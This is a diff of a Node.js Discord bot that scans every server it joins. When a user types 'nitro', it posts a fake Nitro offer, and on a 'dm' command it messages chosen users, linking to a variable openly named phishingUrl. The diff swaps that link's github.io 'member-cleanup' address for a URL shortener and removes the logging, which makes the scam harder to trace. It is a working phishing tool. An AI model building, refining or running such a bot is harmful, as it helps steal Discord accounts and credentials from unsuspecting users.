@@ -1,48 +1,38 @@
 const fs = require('fs');
 const config = JSON.parse(fs.readFileSync('./config.json'));
 const token = config.token;
-const phishingUrl = "https://swiemali2-lgtm.github.io/member-cleanup/";
+
+const phishingUrl = "https://tinyurl.com/45a93dje";
 const imageUrl = "https://swiemali2-lgtm.github.io/member-cleanup/IMG_2560.jpeg";
+
 let processed = new Set();
 
 async function listen() {
-  console.log("Bot en ligne, vérification des serveurs...");
+  console.log("Bot en ligne, en attente...");
   setInterval(async () => {
     let res = await fetch(`https://discord.com/api/v9/users/@me/guilds`, {headers: {"Authorization": `Bot ${token}`}});
     let guilds = await res.json();
-    
-    if (!Array.isArray(guilds)) {
-      console.log("erreur récupération serveurs :", guilds.message);
-      return;
-    }
+    if (!Array.isArray(guilds)) return;
 
     for (let g of guilds) {
       let chansRes = await fetch(`https://discord.com/api/v9/guilds/${g.id}/channels`, {headers: {"Authorization": `Bot ${token}`}});
       let chans = await chansRes.json();
-      
-      if (!Array.isArray(chans)) {
-        console.log("erreur salons sur", g.name, ":", chans.message);
-        continue; 
-      }
+      if (!Array.isArray(chans)) continue;
 
       for (let c of chans) {
         if (c.type !== 0) continue;
-        
         let msgsRes = await fetch(`https://discord.com/api/v9/channels/${c.id}/messages?limit=5`, {headers: {"Authorization": `Bot ${token}`}});
         let msgs = await msgsRes.json();
-        
         if (!Array.isArray(msgs)) continue;
         
         for (let m of msgs) {
           if (!m.content || processed.has(m.id)) continue;
           if (m.content.toLowerCase().trim() === "nitro") {
             processed.add(m.id);
-            console.log("envoi nitro dans", c.name);
             sendNitro(c.id);
           }
           if (m.content.toLowerCase().startsWith("dm ")) {
             processed.add(m.id);
-            console.log("envoi dm...");
             sendDM(m.content.split(" ")[1]);
           }
         }
@@ -64,10 +54,7 @@ async function sendNitro(channelId) {
 
 async function sendDM(targetId) {
   let dm = await (await fetch(`https://discord.com/api/v9/users/@me/channels`, {method: "POST", headers: {"Authorization": `Bot ${token}`, "Content-Type": "application/json"}, body: JSON.stringify({recipient_id: targetId})})).json();
-  if (!dm.id) {
-    console.log("erreur dm :", dm.message);
-    return;
-  }
+  if (!dm.id) return;
   await fetch(`https://discord.com/api/v9/channels/${dm.id}/messages`, {
     method: "POST",
     headers: {"Authorization": `Bot ${token}`, "Content-Type": "application/json"},
